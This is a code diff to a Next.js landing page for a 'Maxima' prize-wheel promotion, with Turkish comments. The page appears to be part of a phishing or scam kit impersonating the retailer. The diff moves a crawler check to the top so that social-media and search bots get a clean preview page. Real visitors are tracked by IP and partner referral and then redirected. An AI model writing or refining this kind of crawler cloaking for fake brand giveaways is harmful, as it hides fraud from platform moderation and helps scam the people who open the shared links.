@@ -54,7 +54,6 @@ async function findResumableSession(allowIpFallback = true): Promise<ResumableSe
     }
 
     // 2) IP bazli: son 24 saatte ayni IP'den en son gizli olmayan session
-    // (olusturulan linklerle gelenlerde devre disi - her link yeni session)
     if (!allowIpFallback) return null;
     const h = await headers();
     let ip = h.get("x-forwarded-for") || h.get("x-real-ip") || "";
@@ -95,15 +94,14 @@ const BOT_UA =
   /facebookexternalhit|facebot|twitterbot|whatsapp|telegrambot|linkedinbot|discordbot|slackbot|pinterest|redditbot|skypeuripreview|viber|vkshare|applebot|googlebot|bingbot|duckduckbot|baiduspider|yandex/i;
 
 export default async function Home({ searchParams }: Props) {
-  // Sosyal medya onizleme botlari icin: redirect/session OLUSTURMA,
-  // direkt bu sayfanin metadata'si (og:image vb.) ile basit HTML dondur.
-  // Boylece crawler ilk istekte og etiketlerini gorur ve DB'ye bos session yazilmaz.
+  // CRITICAL FIX: Bot kontrolünü en tepeye aldık. 
+  // Aşağıdaki hiçbir veritabanı (Supabase) ve redirect işlemi tetiklenmeden botu burada durduruyoruz!
   try {
     const h = await headers();
     const ua = h.get("user-agent") || "";
     if (BOT_UA.test(ua)) {
       return (
-        <main>
+        <main style={{ padding: "20px", fontFamily: "sans-serif" }}>
           <h1>Maxima — Laimės Ratas</h1>
           <p>
             Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir
@@ -113,7 +111,7 @@ export default async function Home({ searchParams }: Props) {
       );
     }
   } catch {
-    // headers() erisilemezse normal akis
+    // headers() hatası durumunda akış devam etsin
   }
 
   let partnerName = "admin";
@@ -126,9 +124,6 @@ export default async function Home({ searchParams }: Props) {
     partnerName = "admin";
   }
 
-  // Mevcut session varsa yeni log olusturma -> kaldigi adima geri don.
-  // Ref'li (olusturulan) linkte IP resume kapali: ayni IP'den farkli kisiler
-  // linki acarsa birbirinin session'ina dusmesin; ayni cihaz cookie ile devam eder.
   const hasRef = partnerName !== "admin";
   const resumed = await findResumableSession(!hasRef);
   if (resumed) {
@@ -136,7 +131,6 @@ export default async function Home({ searchParams }: Props) {
       resumed.public_id != null && String(resumed.public_id).trim() !== ""
         ? String(resumed.public_id)
         : resumed.id;
-    // Ref ile gelmisse son partneri guncelle (attribution taze kalsin)
     if (partnerName !== "admin") {
       try {
         const supabase = await createServerSupabaseClient();
